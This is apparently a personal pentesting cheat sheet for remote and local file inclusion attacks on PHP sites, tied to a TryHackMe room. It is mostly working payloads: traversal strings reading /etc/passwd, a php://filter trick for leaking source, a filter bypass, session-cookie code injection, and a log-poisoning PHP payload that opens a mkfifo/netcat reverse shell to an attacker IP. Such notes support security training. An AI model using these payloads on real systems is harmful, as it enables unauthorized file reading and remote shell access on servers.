<big>Remote File Inclusion - Local File Inclusion</big>

[THM room](https://tryhackme.com/r/room/filepathtraversal)
[Hack Tricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
[URL encoder](https://www.urlencoder.org/)

---
## Basic RFI

#### PHP
If the `allow_url_include` is set `on`, we can execute a reverse shell:

*Attacker's machine: create a server with the revshell.php*
```shell
python3 -m http.server 5050
```

*Attacker's machine: create a listener*
```shell
nc -lvnp 9001
```

*In the browser, trigger the shell*
```text
[url]/?page=http://[ip]:[port]/revshell.php
```

## Basic LFI
If the `include` has a relative path, put `../` as much as necessary until `/etc/passwd` shows up:
```text
[url]/?page=../../../etc/passwd
```

If the `include` has an absolute path, simply use the absolute path:
```text
[url]?page=/etc/passwd
```

## LFI Fuzzing
```shell
ffuf -u [url]?page=FUZZ -w [wordlist]
```

## PHP Filter
[PHP Doc](https://www.php.net/manual/en/wrappers.php.php)

If the file inclusion trigger an error, I will likely have a blank page if `display_errors = off` in the `php.ini` on the target because he tries to execute code on the page and get an error.

To prevent execute, we can base 64 encode the output:
```text
[url]?page=php://filter/convert.base64-encode/resource=[file]
```

## Directory Breakout
[Ressource](https://tryhackme.com/r/room/filepathtraversal#header-5)
In case of `../` filter and base path filter like `/var/www/html`, we can use:
```text
[url]?page=/var/www/html/..//..//../etc/passwd
```

The `..//` path through the `../` filter and goes 2 directories above

## Cookie attack
If we can inject php code in a cookie like `<?php phpinfo(); ?>`, I'll be able to execute the code in LFI:
```text
[url]?page=/var/lib/php/sessions/sess_[cookie-hash-value]
```
<small>Found in developper mode (F12) Storage -> Cookies</small>

```php
<?php
	include($_GET['page']);
?>
```


### Log Poisoning
```shell
nc example.com 80
```

Php payload
```php
<?= `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.14.79.56 9001 >/tmp/f` ?>
```

http://example.com/index.php?page=/var/www/rlfi/logs/access.log#